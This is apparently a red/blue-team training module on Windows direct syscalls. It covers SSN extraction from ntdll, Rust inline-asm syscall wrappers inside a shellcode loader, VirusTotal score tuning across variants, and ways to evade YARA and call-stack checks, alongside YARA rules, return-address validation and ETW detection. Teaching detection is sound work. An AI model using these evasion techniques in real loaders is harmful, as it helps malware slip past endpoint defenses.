# Stage 07: Direct Syscalls — Learning Path

## Module Metadata

| Field | Value |
|-------|-------|
| **Module Name** | Direct Syscalls: Bypassing Userland Hooks |
| **Level** | Advanced |
| **Estimated Time** | 5-7 hours |
| **Category** | Windows Internals / Syscalls / Evasion Engineering / Detection |
| **Platform** | Windows x64 |
| **Binary** | `direct-syscalls.exe` (~279KB, Rust, PE64) |
| **Prerequisites** | Stage 04 (PEB walking, hash resolution, export tables), Stage 05 (Nt* API concepts) |
| **MITRE ATT&CK** | T1106, T1027, T1620, T1562.001 |
| **VT Score** | **3/76** (ESET Agent.ION + Google Detected + Ikarus Trojan.Win64.Crypt) |

### VT Detection Journey

```
 ████████████████████████████████████░░ 3/76  ← CURRENT

   ESET Agent.ION        — sample-burned (common across all stages)
   Google Detected        — inline syscall instruction in .text
   Ikarus Win64.Crypt     — inline syscall instruction in .text

 The syscall instruction (0F 05) in the binary's .text section — NOT in ntdll —
 is the detection signal. This is the fundamental trade-off of direct syscalls:
 you bypass kernel32/ntdll hooks, but the syscall instruction itself becomes
 a signature. Stages 01-04 scored 3/76 without Google/Ikarus; Stage 07 scores
 3/76 WITH them (but without AVG/Avast). Different technique, different detectors.

 Evasion attempts documented:
   5 syscalls + opt-z     → 4/76 (Ikarus + ESET + AVG + Avast)
   5 syscalls + opt-2     → 5/76 (worse — Google added)
   3 syscalls + k32       → 3/76 (best — AVG/Avast dropped)
   3x int 0x2E            → 6/76 (worse — Microsoft Wacatac added)
```

---

## Why This Stage Exists — The Bridge from Stage 04

Stages 01-06 resolve offensive APIs (VirtualAlloc, VirtualProtect, CreateThread) from **kernel32.dll** — either via PEB-walking hash lookup (01-04) or direct IAT imports (05-06). This means every API call passes through **ntdll.dll**, where EDR products install hooks.

Stage 07 eliminates ntdll from the call path entirely. Instead of calling `kernel32!VirtualAlloc` → `kernelbase!VirtualAlloc` → `ntdll!NtAllocateVirtualMemory` → `syscall`, this binary:

1. Finds `ntdll!NtAllocateVirtualMemory` via PEB walk
2. Reads the **System Service Number (SSN)** from the function's stub bytes
3. Issues the `syscall` instruction **directly from its own .text section**

The ntdll function is never called. Any hooks patched into ntdll's function prologue are bypassed completely.

**What your Stage 04 detections DON'T catch:**
- EDR hooks on `NtAllocateVirtualMemory` → bypassed (function is never called)
- API Monitor on `kernel32!VirtualAlloc` → bypassed (kernel32 not used for offensive APIs)
- Breakpoints on ntdll function entry → bypassed (execution goes directly to kernel)

**What DOES still catch it:**
- ETW `Microsoft-Windows-Threat-Intelligence` → kernel-level, sees all syscalls regardless
- Call stack analysis → return address is in .text, not in ntdll (anomalous)
- Static YARA → the `0F 05` (syscall) opcode in .text is detectable

### Real-World Context (2025-2026)

- **SysWhispers / SysWhispers2 / SysWhispers3** — The original direct syscall tooling for C/C++. Generates header files with SSN definitions per Windows version
- **HellsGate** (2020) — Runtime SSN resolution by reading ntdll stub bytes. This is exactly what Stage 07 does
- **Hackmosphere: Bypassing Defender 2025** ([Part 1-2](https://www.hackmosphere.fr/en/bypassing-windows-defender-antivirus-in-2025-evasion-techniques-using-direct-syscalls-and-xor-encryption-part-1/)) — Direct syscalls + XOR bypassing Defender
- **Oblivion: Detecting Direct/Indirect Syscalls** ([2025](https://oblivion-malware.xyz/posts/detecting-syscalls/)) — Return address validation, call stack analysis
- **TrapFlagForSyscalling** ([Maldev Academy 2025](https://github.com/Maldev-Academy/TrapFlagForSyscalling)) — Trap Flag-based syscall tampering

---

## Prerequisites

Before starting this module, you should be comfortable with:
- PEB walking and PE export table parsing from Stage 04
- ntdll Nt* API hashes from Stage 04 (NtAllocateVirtualMemory, NtProtectVirtualMemory, NtCreateThreadEx)
- The difference between kernel32 APIs and ntdll Nt* APIs
- x86-64 inline assembly concepts (registers, calling conventions)
- XOR encryption from Stages 01-02

**Software needed**:
- Ghidra 11.x or IDA Free/Pro
- x64dbg + ScyllaHide
- Python 3.10+
- PE-bear or CFF Explorer

---

## Learning Objectives

By the end of this module, you will be able to:

1. **Explain** the Windows syscall mechanism: user mode → kernel mode transition via the `syscall` instruction
2. **Read** System Service Numbers (SSNs) from ntdll stub bytes and detect if a stub is hooked
3. **Implement** a direct syscall wrapper using inline assembly (Rust `core::arch::asm!`)
4. **Distinguish** direct syscalls from indirect syscalls and explain the trade-offs
5. **Detect** direct syscalls via call stack analysis (return address not in ntdll)
6. **Write** YARA rules targeting the `syscall` instruction in non-ntdll .text sections
7. **Articulate** the evasion trade-off: hook bypass vs new detection surface

---

## Section 1: Theory — The Syscall Mechanism

### How Windows API Calls Normally Work

When legitimate software calls `VirtualAlloc`, the call chain is:

```
Your code
  → kernel32.dll!VirtualAlloc       ← EDR can hook here
    → kernelbase.dll!VirtualAlloc   ← EDR can hook here
      → ntdll.dll!NtAllocateVirtualMemory  ← EDR can hook here
        → mov r10, rcx
        → mov eax, SSN              ← System Service Number
        → syscall                   ← kernel mode transition
          → Windows kernel SSDT dispatch
```

**EDR hooking**: Products like CrowdStrike, SentinelOne, and Microsoft Defender hook ntdll functions by replacing the first bytes with a `JMP` to their monitoring code. This lets them inspect every Nt* call before it reaches the kernel.

### What Direct Syscalls Do

Stage 07 bypasses the entire chain:

```
Your code
  → PEB walk → find ntdll base
  → find_export(NtAllocateVirtualMemory) → function address
  → read_ssn() → extract SSN from stub bytes
  → inline asm: mov r10, rcx; mov eax, SSN; syscall
    → Windows kernel SSDT dispatch (DIRECTLY)
```

The ntdll function is never called. Hooks on ntdll see nothing.

### The ntdll Stub Structure

Every Nt* function in ntdll has the same structure:

```
ntdll!NtAllocateVirtualMemory:
  4C 8B D1          mov r10, rcx      ; save 1st arg (syscall clobbers rcx)
  B8 18 00 00 00    mov eax, 0x18     ; SSN = 0x18 (Windows 10 21H2)
  F6 04 25 08 03 FE test byte ptr [...] ; syscall/int2e selector
  7F 05 00
  75 03             jne use_int2e
  0F 05             syscall           ; fast path
  C3                ret
  CD 2E             int 0x2E          ; slow path (legacy)
  C3                ret
```

**Key bytes for SSN extraction**: `4C 8B D1 B8 XX XX 00 00`
- Offset 0-2: `4C 8B D1` = `mov r10, rcx` (always the same)
- Offset 3: `B8` = `mov eax, imm32`
- Offset 4-5: The SSN (little-endian u16)

If these bytes DON'T match, the function has been **hooked** — an EDR replaced the prologue with a JMP.

### SSNs Change Per Windows Version

| Function | Win10 21H2 | Win11 22H2 | Win11 24H2 |
|----------|-----------|-----------|-----------|
| NtAllocateVirtualMemory | 0x0018 | 0x0018 | 0x0018 |
| NtProtectVirtualMemory | 0x0050 | 0x0050 | 0x0050 |
| NtCreateThreadEx | 0x00C7 | 0x00C7 | 0x00C7 |

These are relatively stable across recent Windows versions, but they CAN change in major updates. This is why the binary resolves SSNs at runtime (reading from ntdll) instead of hardcoding them.

> **Q1**: If an EDR hooks `NtAllocateVirtualMemory` by replacing its first bytes with `JMP hook_handler`, what does `read_ssn()` return?

<details>
<summary>Answer</summary>

`None` — the function detects that the stub doesn't start with `4C 8B D1 B8` and returns `None`, causing the binary to exit silently. This is **hook detection** — the binary can tell if ntdll functions are hooked.

In practice, attackers use fallback strategies: read the SSN from a DIFFERENT unhooked Nt* function and calculate the target SSN by offset (SSNs are sequential). This is the "HellsGate" technique. Stage 07 uses the simpler direct-read approach.

</details>

---

## Section 2: SSN Resolution — Reading the Stub

### The `read_ssn()` Function

```rust
unsafe fn read_ssn(func: *const u8) -> Option<u16> {
    if func.is_null() { return None; }
    // Check: mov r10, rcx (4C 8B D1) + mov eax, imm32 (B8)
    if *func == 0x4C && *func.add(1) == 0x8B
       && *func.add(2) == 0xD1 && *func.add(3) == 0xB8 {
        Some(*(func.add(4) as *const u16))
    } else {
        None // Hooked or unexpected format
    }
}
```

**Step by step**:
1. Find `NtAllocateVirtualMemory` in ntdll's export table (same PEB walk + hash from Stage 04)
2. Read bytes at the function address
3. Verify bytes 0-3 match the expected stub prologue (`4C 8B D1 B8`)
4. Read bytes 4-5 as a little-endian u16 — this is the SSN

### Exercise 1: Dump ntdll SSNs (15 min)

```python
#!/usr/bin/env python3
"""Read SSNs from ntdll stub bytes for common Nt* functions."""
import ctypes

ntdll = ctypes.windll.ntdll
kernel32 = ctypes.windll.kernel32

base = kernel32.GetModuleHandleA(b"ntdll.dll")

functions = [
    "NtAllocateVirtualMemory",
    "NtProtectVirtualMemory",
    "NtCreateThreadEx",
    "NtWaitForSingleObject",
    "NtClose",
    "NtWriteVirtualMemory",
    "NtQueueApcThread",
    "NtResumeThread",
]

for name in functions:
    addr = kernel32.GetProcAddress(base, name.encode())
    if not addr:
        print(f"  {name:35s} NOT FOUND")
        continue

    # Read first 8 bytes of the stub
    stub = (ctypes.c_ubyte * 8).from_address(addr)
    stub_bytes = bytes(stub)

    # Check for expected pattern: 4C 8B D1 B8
    if stub_bytes[0] == 0x4C and stub_bytes[1] == 0x8B and stub_bytes[2] == 0xD1 and stub_bytes[3] == 0xB8:
        ssn = int.from_bytes(stub_bytes[4:6], 'little')
        print(f"  {name:35s} SSN=0x{ssn:04X}  stub={stub_bytes[:8].hex(' ')}")
    else:
        print(f"  {name:35s} HOOKED! stub={stub_bytes[:8].hex(' ')}")
```

**Run this on your VM.** If any function shows "HOOKED!" — your EDR/AV has patched ntdll.

> **Q2**: The SSN is read as a `u16` (2 bytes) but the `mov eax` instruction loads a `u32` (4 bytes). Why does this work?

<details>
<summary>Answer</summary>

SSNs are always small numbers (typically 0x0000 to 0x01FF on current Windows). The upper 2 bytes of the `mov eax, imm32` are always `00 00`. Reading only the lower 2 bytes as a `u16` is sufficient and avoids dealing with the zero-padded upper bytes.

If Windows ever added more than 65,535 syscalls, this would break — but that's not expected.

</details>

---

## Section 3: The Syscall Wrappers — Inline Assembly

### How Direct Syscall Calls Work in Rust

The Windows x64 syscall convention:
- **r10** = first argument (rcx is clobbered by `syscall`)
- **rdx** = second argument
- **r8** = third argument
- **r9** = fourth argument
- **[rsp+0x28]** = fifth argument (on stack)
- **eax** = System Service Number
- **Result** returned in **rax** (NTSTATUS)

### NtAllocateVirtualMemory Wrapper (6 args)

```rust
unsafe fn syscall_alloc(
    ssn: u16, process: *mut c_void, base: *mut *mut c_void,
    zero_bits: usize, size: *mut usize, alloc_type: u32, protect: u32,
) -> i32 {
    let ret: i32;
    core::arch::asm!(
        "sub rsp, 0x38",              // shadow space + 2 stack args
        "mov [rsp+0x28], {a5}",       // 5th arg: AllocationType
        "mov [rsp+0x30], {a6}",       // 6th arg: Protect
        "mov r10, rcx",               // shift 1st arg (syscall clobbers rcx)
        "syscall",                     // kernel mode transition
        "add rsp, 0x38",              // restore stack
        a5 = in(reg) alloc_type as usize,
        a6 = in(reg) protect as usize,
        inout("eax") ssn as u32 => ret,
        in("rcx") process as usize,   // ProcessHandle
        in("rdx") base as usize,      // BaseAddress
        in("r8") zero_bits,            // ZeroBits
        in("r9") size as usize,        // RegionSize
        out("r10") _,
        out("r11") _,                  // syscall clobbers r11
    );
    ret
}
```

**Key details**:
- `sub rsp, 0x38` allocates shadow space (0x20) + room for 2 stack args (0x10) + alignment (0x08)
- Args 5-6 are placed at `[rsp+0x28]` and `[rsp+0x30]` — where the kernel expects them
- `mov r10, rcx` shifts the first argument because `syscall` uses rcx for the return address (RIP)
- The SSN goes in `eax` via the `inout("eax")` constraint

### NtProtectVirtualMemory Wrapper (5 args)

Same pattern but with only 1 stack argument (`OldProtect`).

### NtCreateThreadEx Wrapper (11 args)

The most complex — 7 stack arguments, most zeroed:

```rust
unsafe fn syscall_create_thread(
    ssn: u16, handle_out: *mut *mut c_void, start: *const c_void,
) -> i32 {
    // Args: ThreadHandle, DesiredAccess, ObjAttrs, ProcessHandle,
    //       StartRoutine, Argument, CreateFlags, ZeroBits,
    //       StackSize, MaxStackSize, AttributeList
    // Only ThreadHandle, DesiredAccess (0x1FFFFF), ProcessHandle (-1),
    // and StartRoutine are non-zero
    core::arch::asm!(
        "sub rsp, 0x68",
        "mov qword ptr [rsp+0x28], {start}",  // arg 5: StartRoutine
        "mov qword ptr [rsp+0x30], 0",         // arg 6-11: all NULL/0
        "mov qword ptr [rsp+0x38], 0",
        "mov qword ptr [rsp+0x40], 0",
        "mov qword ptr [rsp+0x48], 0",
        "mov qword ptr [rsp+0x50], 0",
        "mov qword ptr [rsp+0x58], 0",
        "mov r10, rcx",
        "syscall",
        "add rsp, 0x68",
        ...
    );
}
```

### Exercise 2: Trace the Syscall in x64dbg (15 min)

1. Open `direct-syscalls.exe` in x64dbg with ScyllaHide
2. Search for the byte sequence `0F 05` (syscall opcode) in the .text section
3. You should find **3 instances** — one per syscall wrapper
4. Set a breakpoint on the first `0F 05`
5. When hit: check `EAX` — this is the SSN. Check `R10` — this is the first argument
6. Step over the `syscall` — execution enters kernel mode and returns with NTSTATUS in RAX

**Key observation**: The return address (in the call stack) points to YOUR .text section, NOT to ntdll. This is the detection signal.

---

## Section 4: The Hybrid Architecture

### Why Not ALL Syscalls?

Stage 07 uses direct syscalls for the offensive trio (alloc, protect, thread) but resolves WaitForSingleObject and CloseHandle from kernel32 via PEB walk. Why?

**VT evasion data**:

| Approach | Score | Engines |
|----------|-------|---------|
| 5 direct syscalls | 4/76 | ESET + AVG + Avast + Ikarus |
| **3 syscalls + kernel32** | **3/76** | **ESET + Google + Ikarus** |
| 3x int 0x2E (legacy) | 6/76 | ESET + AVG + Avast + Google + Ikarus + Microsoft |

Each `syscall` instruction in .text is a detection signal. Reducing from 5 to 3 dropped AVG/Avast. The `int 0x2E` alternative was WORSE because the legacy interrupt path is even more suspicious.

**The design principle**: Use direct syscalls only for APIs that EDRs actively hook (alloc, protect, thread). Use normal resolution for benign APIs (wait, close) that EDRs don't care about.

### The Two Resolution Paths

```
ntdll resolution (direct syscall):         kernel32 resolution (PEB walk):
┌────────────────────────────┐            ┌────────────────────────────┐
│ find_module(H_NTDLL)       │            │ resolve_api(H_KERNEL32,    │
│ find_export(NtAllocVirtMem)│            │   H_WAITFORSINGLEOBJECT)   │
│ read_ssn() → SSN           │            │ → function pointer         │
│ syscall_alloc(SSN, ...)    │            │ wt(handle, INFINITE)       │
│   mov r10, rcx             │            │   → kernel32 → kernelbase  │
│   mov eax, SSN             │            │   → ntdll → syscall        │
│   syscall ← IN OUR .TEXT   │            │   (normal call chain)      │
└────────────────────────────┘            └────────────────────────────┘
    Bypasses hooks                             Goes through hooks
    Detectable via call stack                  Normal call stack
```

> **Q3**: Why not resolve WaitForSingleObject via syscall too?

<details>
<summary>Answer</summary>

1. **No evasion value**: EDRs don't hook `NtWaitForSingleObject` because it's a benign synchronization API. There's nothing to bypass.
2. **More syscall instructions = more detection**: Each `0F 05` in .text is a signal. Adding unnecessary ones increases the detection surface.
3. **Normal call stack for benign ops**: By using kernel32 for wait/close, those calls have a legitimate ntdll return address in the call stack — reducing anomalies.

</details>

---

## Section 5: Detection Engineering — Catching Direct Syscalls

### YARA Rule: Syscall Instruction in .text

```yara
rule Direct_Syscall_In_Text
{
    meta:
        description = "Detects syscall (0F 05) instruction in PE .text section"
        author      = "Goodboy Framework"
        stage       = "07"
        technique   = "T1106, T1562.001"
        note        = "Low FP: legitimate binaries never contain syscall in .text"

    strings:
        // syscall instruction
        $syscall = { 0F 05 }

        // mov r10, rcx (always precedes syscall in direct syscall pattern)
        $mov_r10_rcx = { 4C 8B D1 }

        // sub rsp pattern (stack setup before syscall)
        $stack_setup = { 48 83 EC }

    condition:
        uint16(0) == 0x5A4D and
        #syscall >= 2 and
        $mov_r10_rcx and
        $stack_setup
}
```

**Why this works**: Legitimate Windows binaries NEVER contain the `syscall` instruction in their .text section. Only ntdll.dll contains it. If `0F 05` appears in a non-ntdll PE, it's either:
- Direct syscalls (malware)
- A syscall emulator/sandbox (security tool)
- An extremely rare custom kernel interface

### YARA Rule: SSN Reading Pattern

```yara
rule SSN_Stub_Reader
{
    meta:
        description = "Detects code that reads ntdll stub bytes to extract SSNs"
        author      = "Goodboy Framework"
        stage       = "07"

    strings:
        // Checking for 4C 8B D1 B8 pattern (ntdll stub signature)
        $check_4c = { 80 ?? 4C }   // cmp byte [reg], 0x4C
        $check_8b = { 80 ?? 8B }   // cmp byte [reg+1], 0x8B
        $check_d1 = { 80 ?? D1 }   // cmp byte [reg+2], 0xD1
        $check_b8 = { 80 ?? B8 }   // cmp byte [reg+3], 0xB8

    condition:
        uint16(0) == 0x5A4D and
        3 of ($check_*)
}
```

### Blue Team: Call Stack Analysis

The strongest runtime detection for direct syscalls is **return address validation**:

```
Normal call (through ntdll):            Direct syscall:
┌──────────────────────────┐           ┌──────────────────────────┐
│ Call Stack:              │           │ Call Stack:              │
│   ntdll!NtAllocVirtMem   │ ← ret    │   direct-syscalls.exe    │ ← ret
│   kernelbase!VirtualAlloc│           │   (no ntdll frame!)     │
│   kernel32!VirtualAlloc  │           │                         │
│   malware.exe!main       │           │                         │
└──────────────────────────┘           └──────────────────────────┘
```

**Detection rule**: After a syscall returns, check if the return address (stored in RCX by the kernel) belongs to ntdll.dll. If it doesn't — it's a direct syscall.

### Exercise 3: Build a Return Address Checker (15 min)

```python
#!/usr/bin/env python3
"""Detect direct syscalls by checking if return addresses are in ntdll."""
import ctypes

kernel32 = ctypes.windll.kernel32

# Get ntdll address range
ntdll_base = kernel32.GetModuleHandleA(b"ntdll.dll")
# To get ntdll size, parse PE headers or use VirtualQuery
# For simplicity, assume ntdll is ~2MB
ntdll_end = ntdll_base + 0x200000

print(f"ntdll range: 0x{ntdll_base:016x} - 0x{ntdll_end:016x}")
print()
print("Detection logic:")
print("  After NtAllocateVirtualMemory returns:")
print("  1. Read the return address from RCX (or from call stack)")
print("  2. Check: ntdll_base <= return_addr < ntdll_end")
print("  3. If FALSE → DIRECT SYSCALL DETECTED")
print()
print("This is what CrowdStrike and SentinelOne use in production.")
print("The kernel itself provides this via ETW Threat Intelligence.")
```

### Exercise 4: ETW Detection Approach (10 min)

The `Microsoft-Windows-Threat-Intelligence` ETW provider is the kernel-level detection mechanism:

| ETW Event | What It Sees | Direct Syscall Visible? |
|-----------|-------------|------------------------|
| KERNEL_THREATINT_TASK_ALLOCVM | NtAllocateVirtualMemory calls | **YES** — kernel sees ALL syscalls |
| KERNEL_THREATINT_TASK_PROTECTVM | NtProtectVirtualMemory calls | **YES** |
| KERNEL_THREATINT_TASK_QUEUEUSERAPC | NtQueueApcThread calls | **YES** |
| Call stack in event data | Return address chain | **Shows .text, not ntdll** |

**Key point**: ETW Threat Intelligence requires a **PPL (Protected Process Light)** driver to consume. Regular user-mode processes can't read it. This is why only EDR vendors (who have signed kernel drivers) can use this detection.

> **Q4**: If ETW sees all syscalls regardless, why do attackers bother with direct syscalls?

<details>
<summary>Answer</summary>

1. **Not all environments have EDR**: Corporate endpoints have CrowdStrike/SentinelOne, but developer machines, VMs, and cloud instances often don't
2. **EDR processing delay**: Even when ETW is active, there's a processing pipeline between the event and the enforcement action. Syscalls are fast; detection is slower
3. **Userland hooks are more common than ETW consumers**: Many security products ONLY hook ntdll (no kernel driver). Direct syscalls bypass these entirely
4. **Defense in depth**: Attackers assume some layers will be present and others won't. Bypassing userland hooks is one layer of evasion, even if kernel-level detection remains

</details>

---

## Section 6: The Evasion Trade-Off — Empirical Data

### What the VT Testing Revealed

During development, multiple approaches were tested:

| Attempt | Technique | Score | What Changed |
|---------|-----------|-------|-------------|
| 1 | 5 direct syscalls (all Nt*) | 4/76 | Baseline with syscall |
| 2 | 5 syscalls + opt-level=2 | 5/76 | WORSE — Google added |
| 3 | **3 syscalls + kernel32 wait/close** | **3/76** | **Best — AVG/Avast dropped** |
| 4 | 3x int 0x2E (legacy interrupt) | 6/76 | WORST — Microsoft Wacatac added |

**Lessons**:
1. Each `syscall` instruction is a detection signal — fewer is better
2. `int 0x2E` is MORE suspicious than `syscall` — AV engines specifically flag the legacy path
3. `opt-level=2` doesn't help here (unlike Stage 01 where it killed Wacatac)
4. Hybrid approach (syscall for offensive APIs, kernel32 for benign) is optimal

### Comparison with Stages 01-04 (No Syscalls)

| Property | Stages 01-04 | Stage 07 |
|----------|-------------|----------|
| API resolution | kernel32 via PEB walk | ntdll SSN + `syscall` instruction |
| Hook bypass | No — goes through ntdll | **Yes** — never calls ntdll functions |
| Call stack | Normal (ntdll return addr) | **Anomalous** (.text return addr) |
| VT Score | 3/76 (ESET + AVG + Avast) | 3/76 (ESET + Google + Ikarus) |
| Detection engines | ML classifiers (AVG/Avast) | **Syscall detectors** (Google/Ikarus) |

Same total score (3/76) but **completely different engines**. Direct syscalls traded ML-based detection for instruction-based detection.

---

## Section 7: Adversarial Thinking

### Challenge 1: The Return Address Problem

Your direct syscall has a return address in .text. EDR checks this. How do you fix it?

<details>
<summary>Approaches</summary>

1. **Indirect syscalls** (Stage 08): Instead of `syscall` in your .text, find the `syscall; ret` gadget inside ntdll and `JMP` to it. Return address appears to come from ntdll
2. **Return address spoofing**: Modify the stack before `syscall` to point the return address back into ntdll
3. **ROP chain**: Build a chain that ends at ntdll's syscall gadget

Stage 08 teaches indirect syscalls — the direct response to this detection.

</details>

### Challenge 2: SSN Resolution Without Read

EDR detects your code reading ntdll stub bytes. How do you get the SSN without touching ntdll?

<details>
<summary>Approaches</summary>

1. **Hardcode SSNs**: Ship a table of SSNs per Windows version. No ntdll access needed. Risk: table becomes outdated
2. **Read from disk**: Load ntdll from `C:\Windows\System32\ntdll.dll` as a file (not the in-memory hooked version). Parse exports from the clean copy
3. **Exception-based resolution**: Hook your own exception handler, then call the hooked ntdll function. When the EDR's hook fires, read the SSN from the hook's trampoline code
4. **Neighbor SSN**: Find ANY unhooked Nt* function, read its SSN, calculate the target SSN by offset (SSNs are sequential in the export table)

</details>

### Challenge 3: Eliminating the `syscall` Instruction Entirely

YARA detects `0F 05` in your .text. How do you make a syscall without that opcode?

<details>
<summary>Approaches</summary>

1. **Indirect syscall** (Stage 08): JMP to ntdll's own `0F 05` gadget — the opcode exists in ntdll (expected) not in your binary
2. **Self-modifying code**: Write `0F 05` to an executable page at runtime, call it, then overwrite it. The opcode is transient
3. **Encrypted stub**: Store the entire syscall wrapper as encrypted bytes, decrypt to an RWX page, call it, re-encrypt. YARA can't match encrypted bytes

The practical answer is indirect syscalls (Stage 08). Direct syscalls are a stepping stone, not the final technique.

</details>

---

## Section 8: The Complete Execution Chain

```
direct-syscalls.exe:
  init_app_config()              [gate 1 — benign code mass]
  verify_env()                   [gate 2 — 5 env var checks]
  preflight()                    [gate 3 — extended env checks]
  PEB.BeingDebugged check        [gate 4 — anti-debug]
  sandbox_check()                [gate 5 — CPU/RAM/disk/uptime]

  ┌─── Phase 1: SSN Resolution (NEW) ──────────────────────────┐
  │ find_module(H_NTDLL) → ntdll base address                  │
  │ find_export(NtAllocateVirtualMemory) → stub address         │
  │ find_export(NtProtectVirtualMemory)  → stub address         │
  │ find_export(NtCreateThreadEx)        → stub address         │
  │ read_ssn() × 3 → SSN for each (+ hook detection)           │
  └─────────────────────────────────────────────────────────────┘

  ┌─── Phase 2: kernel32 Resolution (benign) ──────────────────┐
  │ resolve_api(H_KERNEL32, H_WAITFORSINGLEOBJECT) → fn ptr    │
  │ resolve_api(H_KERNEL32, H_CLOSEHANDLE)         → fn ptr    │
  └─────────────────────────────────────────────────────────────┘

  XOR decrypt 302-byte shellcode    [same as Stages 01-04]

  ┌─── Phase 3: Direct Syscalls (NEW) ─────────────────────────┐
  │ syscall_alloc(SSN, ..., RW)     → NtAllocateVirtualMemory  │
  │ copy shellcode to allocated memory                          │
  │ write_volatile scrub of heap                                │
  │ syscall_protect(SSN, ..., RX)   → NtProtectVirtualMemory   │
  │ syscall_create_thread(SSN, ...) → NtCreateThreadEx          │
  └─────────────────────────────────────────────────────────────┘

  WaitForSingleObject + CloseHandle  [via kernel32, normal path]
  → MessageBox("GoodBoy") appears
```

---

## Section 9: Knowledge Check

**1. What is a System Service Number (SSN)?**

<details>
<summary>Answer</summary>

An index into the kernel's System Service Descriptor Table (SSDT). When the `syscall` instruction fires, the kernel reads the SSN from EAX and dispatches to the corresponding kernel function. Each Nt* function in ntdll has a unique SSN that maps to its kernel implementation.

</details>

**2. The binary reads bytes from ntdll functions but never CALLS them. Why is this not detected by ntdll hooks?**

<details>
<summary>Answer</summary>

EDR hooks work by replacing the FIRST BYTES of a function with a JMP instruction. When code calls the function, the JMP redirects to the EDR's monitoring handler. But `read_ssn()` only READS bytes — it never transfers execution to the function. The EDR's JMP is never triggered. Reading memory doesn't invoke hooks; only executing from that address does.

</details>

**3. You find 3 instances of `0F 05` in a binary's .text section. What does this indicate?**

<details>
<summary>Answer</summary>

Three `syscall` instructions in the PE's own code — almost certainly direct syscalls. Legitimate binaries never contain this opcode; only ntdll.dll does. The binary is making 3 kernel calls without going through ntdll. Cross-reference with `4C 8B D1` (mov r10, rcx) nearby to confirm the direct syscall pattern.

</details>

**4. Stage 07 scores 3/76 with Google+Ikarus. Stages 01-04 score 3/76 with AVG+Avast. Same total — what's different?**

<details>
<summary>Answer</summary>

Different detection engines using different methods:
- **AVG/Avast MalwareX-gen**: ML classifiers that flag byte-pattern distributions (triggered by PEB-walk code mass in Stages 01-04)
- **Google Detected + Ikarus Trojan.Win64.Crypt**: Instruction-pattern scanners that flag the `syscall` opcode in .text (triggered by the inline `0F 05` in Stage 07)

Direct syscalls shifted the detection surface from "code pattern ML" to "instruction signature matching." The total score is the same but the REASON is completely different. This is the fundamental trade-off.

</details>

**5. Why does Stage 07 use kernel32 for WaitForSingleObject instead of a direct syscall?**

<details>
<summary>Answer</summary>

Three reasons:
1. **No evasion value**: EDRs don't hook NtWaitForSingleObject — it's a benign synchronization API
2. **Fewer syscall instructions**: Each `0F 05` in .text is a detection signal. 3 is better than 5
3. **Normal call stack**: The wait/close calls go through ntdll normally, producing legitimate return addresses that reduce call stack anomalies

</details>

---

## Module Summary

| Concept | Stages 01-06 | Stage 07 (NEW) |
|---------|-------------|----------------|
| API resolution target | kernel32.dll | **ntdll.dll** (for offensive APIs) |
| How APIs are called | Through function pointer | **Direct `syscall` instruction** |
| SSN awareness | None | **Read from ntdll stub bytes** |
| Hook detection | None | **Stub byte validation (4C 8B D1 B8)** |
| Hook bypass | No | **Yes — ntdll functions never called** |
| Call stack | Normal (ntdll return address) | **Anomalous (.text return address)** |
| Detection surface | PEB walk + hash constants | **`syscall` opcode in .text + PEB walk** |
| VT detection engines | AVG/Avast (ML) | **Google/Ikarus (instruction pattern)** |

### Common Misconceptions

| What People Believe | What's Actually True |
|--------------------|-----------------------|
| "Direct syscalls are undetectable" | They bypass userland hooks but are detectable via call stack analysis, ETW, and YARA (the `0F 05` opcode in .text) |
| "int 0x2E is stealthier than syscall" | It's WORSE — 6/76 vs 3/76. The legacy interrupt path is more suspicious to AV engines |
| "More syscalls = more evasion" | More syscalls = more `0F 05` instances = more detection signals. Use syscalls only where needed |
| "SSNs must be hardcoded per Windows version" | Runtime resolution from ntdll stubs works across all versions — the HellsGate approach |
| "Direct syscalls make EDR useless" | ETW Threat Intelligence (kernel-level) sees all syscalls. Only userland hooks are bypassed |

### What Breaks at Stage 08 — The Bridge

Stage 07's direct syscalls leave the `syscall` instruction in YOUR .text section — detectable by YARA (`0F 05`) and call stack analysis (return address not in ntdll).

Stage 08 (Indirect Syscalls) solves this: instead of executing `syscall` in your code, find the `syscall; ret` gadget INSIDE ntdll and JMP to it. The `0F 05` opcode only exists in ntdll (expected), and the return address appears to come from ntdll (legitimate). This defeats both YARA and call stack analysis.

### MITRE ATT&CK Mapping

| Technique | ID | How It's Used |
|-----------|----|---------------|
| Native API | T1106 | Direct syscalls to NtAllocateVirtualMemory, NtProtectVirtualMemory, NtCreateThreadEx |
| Obfuscated Files | T1027 | XOR-encrypted shellcode in .rdata |
| Reflective Code Loading | T1620 | Allocate → protect → execute shellcode in own process |
| Impair Defenses: Disable or Modify Tools | T1562.001 | Bypass EDR userland hooks by skipping ntdll function calls |

### Further Reading (2025-2026)

**Syscall techniques:**
- [HellsGate (am0nsec/smelly__vx)](https://github.com/am0nsec/HellsGate) — The original runtime SSN resolution technique
- [SysWhispers3 (klezVirus)](https://github.com/klezVirus/SysWhispers3) — Syscall stub generator with multiple resolution strategies
- [Oblivion: Detecting Syscalls](https://oblivion-malware.xyz/posts/detecting-syscalls/) — Comprehensive detection approaches
- [Hackmosphere: Bypassing Defender 2025](https://www.hackmosphere.fr/en/bypassing-windows-defender-antivirus-in-2025-evasion-techniques-using-direct-syscalls-and-xor-encryption-part-1/)

**Detection:**
- [Cymulate BlindSide](https://cymulate.com/blog/blindside-a-new-technique-for-edr-evasion-with-hardware-breakpoints/) — Hardware breakpoint evasion alongside syscalls
- [Maldev Academy TrapFlagForSyscalling](https://github.com/Maldev-Academy/TrapFlagForSyscalling) — Trap Flag syscall tampering

## What's Next

- **Stage 08 (Indirect Syscalls)**: Eliminate the `syscall` instruction from .text entirely by jumping into ntdll's own syscall gadget — defeats both YARA and call stack analysis
- **Stage 09 (Anti-Debug)**: Use the PEB and ntdll knowledge from Stages 04-08 to implement 7 anti-debug techniques
